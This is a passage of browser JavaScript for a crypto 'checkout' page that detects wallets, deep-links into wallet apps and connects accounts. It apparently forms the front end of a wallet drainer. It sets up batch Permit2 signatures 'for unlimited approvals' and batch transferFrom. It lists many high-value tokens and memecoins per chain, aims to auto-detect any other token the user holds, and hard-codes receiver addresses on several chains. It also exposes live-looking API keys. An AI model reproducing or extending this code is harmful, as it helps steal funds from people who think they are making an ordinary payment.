/**
 * Checkout page - Detects installed wallets and shows buttons to open in each
 * Supports ALL major blockchains (Ethereum, Polygon, Arbitrum, Optimism, Base, BNB, Linea, and more)
 * v7.1 - Added app detection with green badges for installed wallets
 */

// Buffer polyfill — required by @solana/web3.js in the browser
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

console.log("checkout.js loading... v7 - EIP-6963 Multi-Wallet Detection + Deep Links");
console.log("User Agent:", navigator.userAgent);

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9", // EVM chains
  WALLETCONNECT_PROJECT_ID: "45ad3957426c1deae1b5c3d0451b2274",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",

  // ── Non-EVM receiver addresses ────────────────────────────────────────
  SOLANA_RECEIVER: "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
  TRON_RECEIVER:   "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
  BTC_RECEIVER:    "bc1pl88945nc4zpzamt9kwlpxu8qpmjp0mpamjuzc03hx24lvxr7xhgqfgl5js",

  // ── SPL Token addresses (Solana tokens) ────────────────────────────────
  SPL_TOKENS: {
    USDC: { 
      address: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", 
      decimals: 6,
      symbol: "USDC",
      priority: 1 // Highest priority - preferred payment method
    },
    USDT: { 
      address: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", 
      decimals: 6,
      symbol: "USDT",
      priority: 2
    },
    PYUSD: { 
      address: "2b1kV6DkPAnxd5ixfnxCpjxmKwqjjaYmCZfHsFu24GXo", 
      decimals: 6,
      symbol: "PYUSD",
      priority: 3
    },
    // Popular memecoins/tokens
    BONK: { 
      address: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", 
      decimals: 5,
      symbol: "BONK",
      priority: 10
    },
    WIF: { 
      address: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", 
      decimals: 6,
      symbol: "WIF",
      priority: 11
    },
    // Auto-detect any other SPL token the user has
  },


  // ── Payment amount ─────────────────────────────────────────────────────
  // Can be overridden via ?amount=100 in URL. Accepts $1–$500,000.
  PAYMENT_AMOUNT_USD: 100,

  // ── Token list for Permit2 (top supported tokens per chain) ────────────
  TOKEN_LIST: {
    1: [ // Ethereum
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
      { addr: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", sym: "wstETH", dec: 18, price: 2500 },
      { addr: "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704", sym: "cbETH", dec: 18, price: 2500 },
      { addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", sym: "LINK", dec: 18, price: 15 },
      { addr: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", sym: "UNI", dec: 18, price: 8 },
      { addr: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", sym: "AAVE", dec: 18, price: 95 },
    ],
    137: [ // Polygon
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x1BFD67037B42Cf73acF2047067bd4f2C47D9BfD6", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [ // Base
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x4200000000000000000000000000000000000006", sym: "WETH", dec: 18, price: 2500 },
    ],
    56: [ // BNB Chain
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
      { addr: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", sym: "BUSD", dec: 18, price: 1 },
      { addr: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", sym: "ETH", dec: 18, price: 2500 },
    ],
    42161: [ // Arbitrum
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", sym: "USDT", dec: 6, price: 1 },
      { addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", sym: "WETH", dec: 18, price: 2500 },
    ],
    10: [ // Optimism
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", sym: "USDT", dec: 6, price: 1 },
      { addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x4200000000000000000000000000000000000006", sym: "WETH", dec: 18, price: 2500 },
    ],
  },

  // ── Deployed CheckoutPermit2 contract addresses (per chain) ────────────
  // After deploying to a new chain, add the address here.
  CHECKOUT_CONTRACTS: {
    11155111: "0xc200b8d056bc579c62f53d6832e50f066e98f0af", // Sepolia (deployed)
    // 1:       "0x...",   // Ethereum mainnet  — deploy first
    // 137:     "0x...",   // Polygon           — deploy first
    // 56:      "0x...",   // BNB Chain         — deploy first
    // 42161:   "0x...",   // Arbitrum          — deploy first
    // 10:      "0x...",   // Optimism          — deploy first
    // 8453:    "0x...",   // Base              — deploy first
  },

  // ── Stablecoin + WBTC token addresses per chain (Permit2 / gasless path) ──
  // These are the tokens users can pay with WITHOUT paying gas themselves.
  STABLECOINS: {
    1: {       // Ethereum
      USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
      USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
      WBTC: { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
    },
    11155111: { // Sepolia testnet
      USDC: { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", decimals: 6 },
    },
    137: {     // Polygon
      USDC: { address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
      USDT: { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
    },
    56: {      // BNB Chain — USDC/USDT are 18 decimals here, not 6!
      USDC: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
      USDT: { address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    },
    42161: {   // Arbitrum
      USDC: { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
      USDT: { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
    },
    10: {      // Optimism
      USDC: { address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
      USDT: { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
    },
    8453: {    // Base
      USDC: { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
    },
  },

  // ── Native token USD prices (for native-transfer fallback path) ─────────
  TOKEN_PRICES: {
    1: 2500, 11155111: 2500, 137: 1, 56: 600,
    10: 2500, 42161: 2500, 8453: 2500, 59144: 2500
  },

  // ── Non-EVM token prices (for amount conversion display) ─────────────
  NON_EVM_PRICES: {
    SOL: 150,   // $150 per SOL — update as needed
    TRX: 0.13,  // $0.13 per TRX
    BTC: 65000, // $65,000 per BTC
  },

  // ── USDT TRC-20 address on Tron (for Tron stablecoin payments) ────────
  TRON_USDT_ADDRESS: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Official USDT on Tron (mainnet)
  
  // RPC URLs for WalletConnect - hardcoded for browser
  RPC_URLS: {
    1: "https://eth-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    137: "https://polygon-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    42161: "https://arb-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    10: "https://opt-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    8453: "https://base-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    56: "https://bsc-dataseed.bnbchain.org:443",
    59144: "https://rpc.linea.build",
    11155111: "https://eth-sepolia.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N"
  },
  
  // Comprehensive EVM networks configuration
  NETWORKS: {
    // Ethereum
    1: {
      name: "Ethereum",
      tokenAddress: null, // null means use native ETH
      isNative: true,
    },
    // Sepolia Testnet
    11155111: {
      name: "Sepolia",
      tokenAddress: null, // null means use native ETH
      isNative: true,
    },
    // Polygon
    137: {
      name: "Polygon",
      tokenAddress: null, // null means use native MATIC
      isNative: true,
    },
    // BNB Chain
    56: {
      name: "BNB Chain",
      tokenAddress: null, // null means use native BNB
      isNative: true,
    },
    // Optimism
    10: {
      name: "Optimism",
      tokenAddress: null, // null means use native ETH
      isNative: true,
    },
    // Arbitrum
    42161: {
      name: "Arbitrum",
      tokenAddress: null, // null means use native ETH
      isNative: true,
    },
    // Base
    8453: {
      name: "Base",
      tokenAddress: null, // null means use native ETH
      isNative: true,
    },
    // Linea
    59144: {
      name: "Linea",
      tokenAddress: null, // null means use native ETH
      isNative: true,
    },
  },
  
  // Block explorer URLs for each network
  EXPLORER_URLS: {
    1: "https://etherscan.io",
    11155111: "https://sepolia.etherscan.io",
    137: "https://polygonscan.com",
    56: "https://bscscan.com",
    10: "https://optimistic.etherscan.io",
    42161: "https://arbiscan.io",
    8453: "https://basescan.org",
    59144: "https://lineascan.build"
  }
};

let provider, signer, userAddress;
let EthereumProvider; // Will be loaded async
let userPaymentAmount = null; // Will store the user's entered amount in USD

// ── ERC-20 helpers for Permit2 stablecoin path ──────────────────────────
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];
function getERC20(address) {
  return new ethers.Contract(address, ERC20_ABI, provider);
}

// ── Permit2 ABI (minimal for unlimited approvals) ─────────────────────────
const PERMIT2_ABI = [
  "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  "function permit(address owner, (tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature)",
  "function transferFrom((address from, address to, uint160 amount, address token)[] transferDetails) external"
];

// Random 256-bit nonce for each Permit2 signature (Permit2 uses bitmap nonces)
function getFreshNonce() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return BigInt("0x" + Array.from(bytes, b => b.toString(16).padStart(2, "0")).join(""));
}

// EIP-6963: Dynamically discover ALL installed browser extension wallets
// (MetaMask, Rabby, Coinbase, Rainbow, Brave Wallet, Phantom, OKX, etc.)
// This works for ANY wallet extension that follows the EIP-6963 standard -
// no hardcoding needed, it detects whatever is actually installed.
const discoveredProviders = new Map(); // uuid -> { info, provider }

window.addEventListener("eip6963:announceProvider", (event) => {
  const { info, provider: prov } = event.detail;
  console.log(`✓ EIP-6963 wallet discovered: ${info.name} (${info.rdns})`);
  discoveredProviders.set(info.uuid, { info, provider: prov });
});

// Request all wallets to announce themselves
function requestWalletProviders() {
  discoveredProviders.clear();
  window.dispatchEvent(new Event("eip6963:requestProvider"));
}

const el = {
  status: document.getElementById("status"),
  card: document.querySelector(".card"),
};

// Load EthereumProvider asynchronously
async function loadWalletConnect() {
  try {
    console.log("Loading WalletConnect...");
    
    // First check if it's already loaded
    if (window.WalletConnectEthereumProvider) {
      console.log("✓ WalletConnect already available globally");
      return true;
    }
    
    if (window.EthereumProvider) {
      console.log("✓ EthereumProvider already available globally");
      return true;
    }
    
    // Try to load via dynamic import (ESM)
    console.log("Attempting ESM import of WalletConnect...");
    try {
      const module = await import("https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/+esm");
      EthereumProvider = module.default || module.EthereumProvider;
      if (!EthereumProvider) {
        throw new Error("Module exports neither default nor EthereumProvider");
      }
      console.log("✓ WalletConnect loaded via ESM import");
      return true;
    } catch (emsErr) {
      console.warn("ESM import failed, trying UMD script...", emsErr.message);
      
      // Fallback: try UMD script
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js';
      script.async = false;
      
      return new Promise((resolve, reject) => {
        script.onload = () => {
          console.log("Script loaded, checking for globals...");
          
          // Check multiple possible export names
          if (window.WalletConnectEthereumProvider) {
            EthereumProvider = window.WalletConnectEthereumProvider;
            console.log("✓ WalletConnect loaded as WalletConnectEthereumProvider");
            resolve(true);
          } else if (window.EthereumProvider) {
            EthereumProvider = window.EthereumProvider;
            console.log("✓ WalletConnect loaded as EthereumProvider");
            resolve(true);
          } else if (window.Provider) {
            EthereumProvider = window.Provider;
            console.log("✓ WalletConnect loaded as Provider");
            resolve(true);
          } else {
            console.error("Script loaded but no recognized global found. Available globals:", Object.keys(window).filter(k => k.includes('Provider') || k.includes('Ethereum') || k.includes('Wallet')));
            reject(new Error("Script loaded but provider not exposed in window"));
          }
        };
        
        script.onerror = () => {
          console.error("Failed to load WalletConnect UMD script");
          reject(new Error("Failed to load WalletConnect script from CDN"));
        };
        
        document.head.appendChild(script);
      });
    }
  } catch (err) {
    console.error("Failed to load WalletConnect:", err);
    return false;
  }
}

function detectInstalledWallets() {
  const ua = navigator.userAgent.toLowerCase();
  console.log("Detecting wallets. User agent:", ua);
  
  const wallets = [];
  
  // MetaMask
  if (ua.includes("metamask")) {
    console.log("✓ MetaMask detected (in-app browser)");
    wallets.push({ name: "MetaMask" });
  }
  
  // Trust Wallet
  if (ua.includes("trust wallet") || ua.includes("trustwallet") || ua.includes("trust/")) {
    console.log("✓ Trust Wallet detected (in-app browser)");
    wallets.push({ name: "Trust Wallet" });
  }
  
  // Coinbase Wallet
  if (ua.includes("coinbasewallet")) {
    console.log("✓ Coinbase Wallet detected (in-app browser)");
    wallets.push({ name: "Coinbase Wallet" });
  }
  
  // Token Pocket
  if (ua.includes("tokenpocket")) {
    console.log("✓ Token Pocket detected (in-app browser)");
    wallets.push({ name: "Token Pocket" });
  }
  
  console.log(`Found ${wallets.length} in-app wallet browsers`);
  return wallets;
}

// Detect which wallets are actually installed on this device
function getInstalledWalletNames() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  // Browser extensions (desktop)
  if (typeof window.ethereum !== "undefined") {
    if (window.ethereum.isMetaMask) installed.add("MetaMask");
    if (window.ethereum.isTrust) installed.add("Trust Wallet");
    if (window.ethereum.isCoinbaseWallet) installed.add("Coinbase Wallet");
    if (window.ethereum.isRabby) installed.add("Rabby");
  }
  if (typeof window.trustwallet !== "undefined") installed.add("Trust Wallet");
  if (typeof window.okxwallet !== "undefined") installed.add("OKX");
  if (typeof window.BinanceChain !== "undefined") installed.add("Binance");
  if (typeof window.phantom !== "undefined") installed.add("Phantom");
  if (typeof window.zerionDapp !== "undefined") installed.add("Zerion");
  if (typeof window.tokenPocket !== "undefined") installed.add("Token Pocket");
  if (typeof window.imToken !== "undefined") installed.add("imToken");
  
  // User agent detection (mobile in-app browsers)
  if (ua.includes("metamask")) installed.add("MetaMask");
  if (ua.includes("trust")) installed.add("Trust Wallet");
  if (ua.includes("coinbase")) installed.add("Coinbase Wallet");
  if (ua.includes("rainbow")) installed.add("Rainbow");
  if (ua.includes("rabby")) installed.add("Rabby");
  if (ua.includes("okx")) installed.add("OKX");
  if (ua.includes("imtoken")) installed.add("imToken");
  if (ua.includes("token pocket") || ua.includes("tokenpocket")) installed.add("Token Pocket");
  if (ua.includes("phantom")) installed.add("Phantom");
  if (ua.includes("zerion")) installed.add("Zerion");
  if (ua.includes("1inch")) installed.add("1inch");
  if (ua.includes("safepal")) installed.add("SafePal");
  if (ua.includes("bitget")) installed.add("Bitget");
  if (ua.includes("mathwallet")) installed.add("MathWallet");
  if (ua.includes("argent")) installed.add("Argent");
  if (ua.includes("bybit")) installed.add("Bybit Wallet");
  if (ua.includes("binance")) installed.add("Binance Web3");
  if (ua.includes("ledger")) installed.add("Ledger Live");
  if (ua.includes("trezor")) installed.add("Trezor Suite");
  
  return installed;
}

// Full catalog of 20+ popular wallets with their deep link / universal link formats
// Updated with grid layout support and more wallets (Bybit, Binance, etc.)
const WALLET_CATALOG = [
  {
    name: "WalletConnect",
    icon: "🔗",
    color: "#3b99fc",
    isQR: true // Special flag for QR code connector - PRIMARY OPTION
  },
  {
    name: "MetaMask",
    icon: "🦊",
    color: "#f6851b",
    getLink: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`
  },
  {
    name: "Trust Wallet",
    icon: "🛡️",
    color: "#3375bb",
    getLink: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`
  },
  {
    name: "Coinbase Wallet",
    icon: "🔵",
    color: "#1652f0",
    getLink: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`
  },
  {
    name: "Rainbow",
    icon: "🌈",
    color: "#0ac7f0",
    getLink: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "Rabby Wallet",
    icon: "🐰",
    color: "#8c6cf4",
    getLink: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "OKX Wallet",
    icon: "⚫",
    color: "#000000",
    getLink: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`
  },
  {
    name: "imToken",
    icon: "🔷",
    color: "#11b9f8",
    getLink: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`
  },
  {
    name: "Token Pocket",
    icon: "🟦",
    color: "#1296db",
    getLink: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`
  },
  {
    name: "Phantom",
    icon: "👻",
    color: "#ab9ff2",
    getLink: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`
  },
  {
    name: "Zerion",
    icon: "🔺",
    color: "#6366f1",
    getLink: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "1inch Wallet",
    icon: "🦄",
    color: "#1a1a1a",
    getLink: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "SafePal",
    icon: "🔐",
    color: "#25252d",
    getLink: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "Bitget",
    icon: "🟠",
    color: "#f6a200",
    getLink: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`
  },
  {
    name: "MathWallet",
    icon: "🔢",
    color: "#4a90e2",
    getLink: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "Argent",
    icon: "🅰️",
    color: "#ff6b35",
    getLink: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`
  },
  {
    name: "Bybit",
    icon: "₿",
    color: "#f7921e",
    getLink: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "Binance",
    icon: "🏦",
    color: "#f3ba2f",
    getLink: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`
  },
  {
    name: "Ledger Live",
    icon: "💎",
    color: "#000000",
    getLink: (url) => `ledger://dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "Trezor Suite",
    icon: "🔒",
    color: "#000000",
    getLink: (url) => `trezor://dapp?url=${encodeURIComponent(url)}`
  },
  {
    name: "Ethers.js Direct",
    icon: "⚡",
    color: "#4a5568",
    isDirect: true // Direct browser connection
  },
];

function showWalletModal() {
  const currentUrl = window.location.href;

  const existing = document.getElementById("walletModalOverlay");
  if (existing) existing.remove();

  const overlay = document.createElement("div");
  overlay.id = "walletModalOverlay";
  overlay.style.cssText = `
    position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.55);
    display:flex;align-items:center;justify-content:center;z-index:99999;padding:16px;
  `;

  const box = document.createElement("div");
  box.style.cssText = `
    background:white;border-radius:16px;padding:24px;max-width:420px;width:100%;
    max-height:85vh;overflow-y:auto;box-shadow:0 12px 48px rgba(0,0,0,0.35);
  `;
  box.innerHTML = `
    <h2 style="margin:0 0 4px 0;font-size:20px;font-weight:700;">Select Your Wallet</h2>
    <p style="margin:0 0 20px 0;color:#666;font-size:13px;">Connect and pay instantly.</p>
  `;

  const grid = document.createElement("div");
  grid.style.cssText = "display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;";

  if (typeof window.ethereum !== "undefined") requestWalletProviders();

  setTimeout(() => {
    const installedProviders = Array.from(discoveredProviders.values());
    if (installedProviders.length > 0) {
      const lbl = document.createElement("div");
      lbl.style.cssText = `grid-column:1/-1;font-size:12px;color:#10b981;font-weight:700;
        border-bottom:2px solid #10b98120;padding-bottom:8px;margin-bottom:8px;`;
      lbl.textContent = "✓ Installed";
      grid.appendChild(lbl);
      installedProviders.slice(0, 6).forEach(({ info, provider: prov }) => {
        grid.appendChild(createWalletButton(info, () => {
          overlay.remove();
          connectViaInjectedProvider(prov);
        }));
      });
    } else if (typeof window.ethereum !== "undefined") {
      const lbl = document.createElement("div");
      lbl.style.cssText = `grid-column:1/-1;font-size:12px;color:#10b981;font-weight:700;
        border-bottom:2px solid #10b98120;padding-bottom:8px;margin-bottom:8px;`;
      lbl.textContent = "✓ Browser Wallet";
      grid.appendChild(lbl);
      grid.appendChild(createWalletButton({ name: "Browser Wallet", icon: "✅" }, () => {
        overlay.remove(); connectViaInjectedProvider();
      }));
    }

    const popularWallets = ["MetaMask","Phantom","Bitget","OKX Wallet","Trust Wallet","Binance","Rainbow","Coinbase Wallet","WalletConnect"];
    const popularLbl = document.createElement("div");
    popularLbl.style.cssText = `grid-column:1/-1;font-size:12px;color:#888;font-weight:700;
      border-bottom:1px solid #eee;padding-bottom:8px;margin:12px 0 8px 0;`;
    popularLbl.textContent = "📱 All Wallets";
    grid.appendChild(popularLbl);

    popularWallets.forEach(walletName => {
      const wallet = WALLET_CATALOG.find(w => w.name === walletName);
      if (!wallet) return;
      if (wallet.isQR) {
        grid.appendChild(createWalletButton(wallet, () => { overlay.remove(); connectViaWalletConnect(); }, true));
      } else {
        grid.appendChild(createWalletButton(wallet, () => {
          overlay.remove();
          setTimeout(() => { window.location.href = wallet.getLink(currentUrl); }, 300);
        }));
      }
    });
  }, 150);

  box.appendChild(grid);

  const closeBtn = document.createElement("button");
  closeBtn.textContent = "✕ Cancel";
  closeBtn.style.cssText = `
    width:100%;margin-top:16px;padding:12px 16px;border:none;
    border-radius:8px;background:#f5f5f5;cursor:pointer;
    font-size:15px;font-weight:500;transition:all 0.2s;
  `;
  closeBtn.onmouseover = () => closeBtn.style.background = "#efefef";
  closeBtn.onmouseout  = () => closeBtn.style.background = "#f5f5f5";
  closeBtn.onclick = () => overlay.remove();
  box.appendChild(closeBtn);
  overlay.appendChild(box);
  document.body.appendChild(overlay);
}

// Helper function to create wallet buttons
function createWalletButton(wallet, onClick, isQR = false) {
  const btn = document.createElement("button");
  const iconHtml = wallet.icon || "💳";
  
  btn.innerHTML = `<div style="position:relative;width:100%;"><div style="font-size:28px;margin-bottom:6px;">${iconHtml}</div><div style="font-size:11px;line-height:1.2;font-weight:600;">${wallet.name}</div></div>`;
  
  const walletColor = wallet.color || "#e0e0e0";
  btn.style.cssText = `
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 14px 10px;
    border: 1.5px solid ${walletColor};
    border-radius: 10px;
    background: white;
    cursor: pointer;
    font-size: 12px;
    color: #333;
    transition: all 0.2s;
    text-align: center;
    font-weight: 500;
    min-height: 100px;
    position: relative;
  `;
  
  btn.onmouseover = () => {
    btn.style.background = `${walletColor}15`;
    btn.style.borderColor = walletColor;
    btn.style.transform = "translateY(-2px)";
    btn.style.boxShadow = `0 4px 12px ${walletColor}30`;
  };
  
  btn.onmouseout = () => {
    btn.style.background = "white";
    btn.style.borderColor = walletColor;
    btn.style.transform = "translateY(0)";
    btn.style.boxShadow = "none";
  };
  
  btn.onclick = onClick;
  return btn;
}

function walletBtnStyle(highlighted) {
  return `
    display:flex;
    align-items:center;
    width:100%;
    padding: 14px 16px;
    border: 1px solid ${highlighted ? "#2b5fff" : "#e0e0e0"};
    border-radius: 10px;
    background: ${highlighted ? "#eef2ff" : "white"};
    cursor: pointer;
    font-size: 16px;
    font-weight: 500;
    text-align: left;
    transition: all 0.15s;
  `;
}

function showWalletSelector() {
  console.log("===== WALLET SELECTOR =====");
  
  // If we're already INSIDE a mobile wallet's in-app browser (e.g. opened via
  // MetaMask's own browser), connect directly - no need to show the picker again.
  const inAppWallets = detectInstalledWallets();
  if (inAppWallets.length > 0 && typeof window.ethereum !== "undefined") {
    console.log(`✓ Inside ${inAppWallets[0].name}'s in-app browser, connecting directly`);
    connectViaInjectedProvider();
    return;
  }
  
  // Otherwise show the wallet picker modal:
  // - Desktop: lists every EIP-6963 wallet extension actually installed
  // - Mobile: lists deep links to open each wallet's own in-app browser
  console.log("Showing wallet picker modal...");
  showWalletModal();
}

async function connectViaInjectedProvider(specificProvider) {
  try {
    const targetProvider = specificProvider || window.ethereum;
    
    if (!targetProvider) {
      throw new Error("No wallet provider available");
    }
    
    console.log("📱 Requesting wallet connection...");
    setStatus("⏳ Waiting for wallet confirmation...", "info");
    
    // Request account access - this is the ONLY popup user will see
    const accounts = await targetProvider.request({ 
      method: 'eth_requestAccounts' 
    });
    
    if (!accounts || accounts.length === 0) {
      throw new Error("Wallet connection cancelled or no accounts available");
    }
    
    userAddress = accounts[0];
    console.log("✅ Wallet connected:", userAddress);
    
    // Setup provider and signer
    provider = new ethers.BrowserProvider(targetProvider);
    signer = await provider.getSigner();
    
    console.log("✅ Ready to execute payment");
    showAccountInfo();
    
  } catch (err) {
    console.error("Wallet connection error:", err.message);
    
    if (err.message.includes("user rejected")) {
      setStatus("❌ Wallet connection cancelled. Please try again.", "error");
    } else {
      setStatus("❌ Wallet error: " + err.message, "error");
    }
  }
}

async function connectViaWalletConnect() {
  try {
    console.log("Opening WalletConnect app picker...");
    
    // Ensure WalletConnect is loaded
    if (!EthereumProvider) {
      console.log("Loading WalletConnect provider...");
      const loaded = await loadWalletConnect();
      if (!loaded) {
        throw new Error("Failed to load WalletConnect");
      }
    }
    
    console.log("Initializing WalletConnect with projectId:", CONFIG.WALLETCONNECT_PROJECT_ID);
    
    // Define all supported chains for WalletConnect
    const supportedChains = [
      { chainId: 1, name: "Ethereum" },
      { chainId: 137, name: "Polygon" },
      { chainId: 42161, name: "Arbitrum" },
      { chainId: 10, name: "Optimism" },
      { chainId: 8453, name: "Base" },
      { chainId: 56, name: "BNB Chain" },
      { chainId: 59144, name: "Linea" },
      { chainId: 11155111, name: "Sepolia" }
    ];
    
    const wcProvider = await EthereumProvider.init({
      projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
      chains: [1, 137, 42161, 10, 8453, 56, 59144, 11155111], // All 8 networks
      optionalChains: [1, 137, 42161, 10, 8453, 56, 59144, 11155111],
      showQrModal: true, // This will show the app picker on mobile
      methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"],
      events: ["chainChanged", "accountsChanged"],
      rpcMap: CONFIG.RPC_URLS
    });
    
    console.log("WalletConnect provider initialized, connecting...");
    await wcProvider.connect();
    console.log("✓ WalletConnect connected");
    
    // Use ethers v6 BrowserProvider instead of v5 Web3Provider
    provider = new ethers.BrowserProvider(wcProvider);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    
    console.log("Connected wallet address:", userAddress);
    showAccountInfo();
    
